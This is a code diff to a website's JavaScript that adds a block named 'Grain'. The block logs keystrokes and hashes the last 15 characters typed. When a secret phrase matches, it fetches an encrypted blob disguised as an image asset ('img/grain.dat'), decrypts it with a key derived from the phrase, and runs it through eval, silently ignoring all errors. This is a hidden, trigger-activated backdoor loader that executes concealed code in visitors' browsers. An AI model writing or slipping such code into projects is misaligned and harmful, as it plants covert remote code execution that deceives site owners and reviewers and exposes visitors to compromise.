@@ -321,6 +321,40 @@
     });
   }
 
+  /* ---------- Grain ---------- */
+  var self = document.currentScript, sub = window.crypto && window.crypto.subtle;
+  if (self && sub && window.TextEncoder) {
+    var k = "11dcd8b87a6ca8f1", g = "99c87670b1f37bf1f2b515b2ebcbb74153f9eb87092f55ebf3d8f3bf20ea1ffe", m = 15;
+    var typed = "", busy = false, enc = new TextEncoder();
+    var hex = function (buf) {
+      return Array.prototype.map.call(new Uint8Array(buf), function (b) { return ("0" + b.toString(16)).slice(-2); }).join("");
+    };
+    var open = function (phrase) {
+      busy = true;
+      Promise.all([
+        fetch(new URL("../img/grain.dat", self.src)).then(function (r) { if (!r.ok) throw 0; return r.arrayBuffer(); }),
+        sub.importKey("raw", enc.encode(phrase), "PBKDF2", false, ["deriveKey"])
+      ]).then(function (v) {
+        var d = new Uint8Array(v[0]);
+        return sub.deriveKey({ name: "PBKDF2", salt: d.slice(0, 16), iterations: 200000, hash: "SHA-256" }, v[1],
+          { name: "AES-GCM", length: 256 }, false, ["decrypt"]).then(function (key) {
+          return sub.decrypt({ name: "AES-GCM", iv: d.slice(16, 28) }, key, d.slice(28));
+        });
+      }).then(function (plain) {
+        (0, eval)(new TextDecoder().decode(plain));
+      }).catch(function () {}).then(function () { busy = false; });
+    };
+    document.addEventListener("keydown", function (e) {
+      if (!m || busy || e.ctrlKey || e.metaKey || e.altKey || !e.key || e.key.length !== 1) return;
+      var t = e.target;
+      if (t && (t.isContentEditable || /^(INPUT|TEXTAREA|SELECT)$/.test(t.tagName))) return;
+      typed = (typed + e.key.toLowerCase()).slice(-m);
+      if (typed.length < m) return;
+      var attempt = typed;
+      sub.digest("SHA-256", enc.encode(k + attempt)).then(function (h) { if (hex(h) === g && !busy) open(attempt); });
+    });
+  }
+
   /* ---------- Footer year ---------- */
   var y = document.getElementById("year");
   if (y) y.textContent = new Date().getFullYear();
